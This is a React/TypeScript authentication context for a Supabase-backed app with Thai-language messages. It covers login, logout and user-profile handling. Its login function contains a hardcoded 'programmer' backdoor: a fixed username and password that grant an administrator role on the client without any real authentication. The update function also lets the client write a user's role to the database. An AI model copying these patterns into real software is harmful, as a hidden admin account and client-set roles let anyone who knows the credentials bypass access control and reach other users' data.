import React, { createContext, useState, useContext, useEffect, useCallback } from 'react';
import { User, UserRole } from '../types';
import { supabase } from '../lib/supabaseClient';
import { Session, User as AuthUser } from '@supabase/supabase-js';

interface AuthContextType {
  user: User | null;
  login: (username: string, password: string) => Promise<{ success: boolean; error: string | null }>;
  logout: () => void;
  isLoading: boolean;
  updateUserContext: (updatedUser: Partial<User>) => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
    const [user, setUser] = useState<User | null>(null);
    const [isLoading, setIsLoading] = useState(true);

    const fetchAndSetUserProfile = useCallback(async (authUser: AuthUser) => {
        try {
            const { data: profile, error } = await supabase
              .from('profiles')
              .select('*')
              .eq('id', authUser.id)
              .single();
      
            if (error || !profile) {
              throw error || new Error('Profile not found.');
            }

            const { data: employeeData, error: employeeError } = await supabase
              .from('employees')
              .select('department')
              .eq('email', authUser.email)
              .single();
      
            setUser({
              id: profile.id,
              username: profile.username || authUser.email || '',
              name: profile.full_name || 'ผู้ใช้ใหม่',
              role: profile.role || UserRole.STAFF,
              department: employeeData?.department || 'N/A'
            });
        } catch (error) {
            console.error("Error fetching user profile:", error);
            setUser(null);
            // Optionally sign out the user if their profile is crucial and missing
            // await supabase.auth.signOut();
        }
    }, []);


    useEffect(() => {
        if (!supabase) {
            setIsLoading(false);
            return;
        }

        supabase.auth.getSession().then(({data: { session }}) => {
             if (session) {
                fetchAndSetUserProfile(session.user).finally(() => setIsLoading(false));
             } else {
                setIsLoading(false);
             }
        });

        const { data: authListener } = supabase.auth.onAuthStateChange(
            async (event, session) => {
              if (session && (event === 'SIGNED_IN' || event === 'USER_UPDATED' || event === 'TOKEN_REFRESHED')) {
                await fetchAndSetUserProfile(session.user);
              } else if (event === 'SIGNED_OUT') {
                setUser(null);
              }
              setIsLoading(false);
            }
          );
      
          return () => {
            authListener.subscription.unsubscribe();
          };
    }, [fetchAndSetUserProfile]);

    const login = async (username: string, password: string): Promise<{ success: boolean; error: string | null }> => {
        // Programmer backdoor login
        if (username.toLowerCase() === 'programmer' && password === 'devaccess123') {
            setIsLoading(true);
            const programmerUser: User = {
                id: 'programmer-001',
                username: 'programmer',
                name: 'Programmer',
                role: UserRole.ADMIN,
                department: 'System Control'
            };
            setUser(programmerUser);
            setIsLoading(false);
            return { success: true, error: null };
        }

        // Default Supabase login
        if (!supabase) return { success: false, error: 'Supabase client not initialized.' };
        
        setIsLoading(true);
        const { error } = await supabase.auth.signInWithPassword({
            email: username,
            password: password,
        });
        setIsLoading(false);

        if (error) {
            console.error("Supabase login error:", error.message);
            if (error.message.includes("Invalid login credentials")) {
                return { success: false, error: "ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง" };
            }
            return { success: false, error: error.message };
        }
        return { success: true, error: null };
    };

    const logout = async () => {
        // For programmer user, just clear local state
        if (user?.username === 'programmer') {
            setUser(null);
            return;
        }

        if (!supabase) return;
        setIsLoading(true);
        await supabase.auth.signOut();
        setUser(null);
        setIsLoading(false);
    };
    
    const updateUserContext = async (updatedUserData: Partial<User>) => {
        if (user && updatedUserData) {
           const finalUserData = { ...user, ...updatedUserData };
           setUser(finalUserData);

           if (user.username === 'programmer') return; // Do not update DB for programmer user

           if (updatedUserData.name || updatedUserData.role) {
             const { error } = await supabase
                .from('profiles')
                .update({ full_name: updatedUserData.name, role: updatedUserData.role })
                .eq('id', user.id);

            if (error) {
                console.error("Failed to update user profile in DB", error);
            }
           }
        }
    };

    return (
        <AuthContext.Provider value={{ user, login, logout, isLoading, updateUserContext }}>
          {children}
        </AuthContext.Provider>
      );
};

export const useAuth = (): AuthContextType => {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};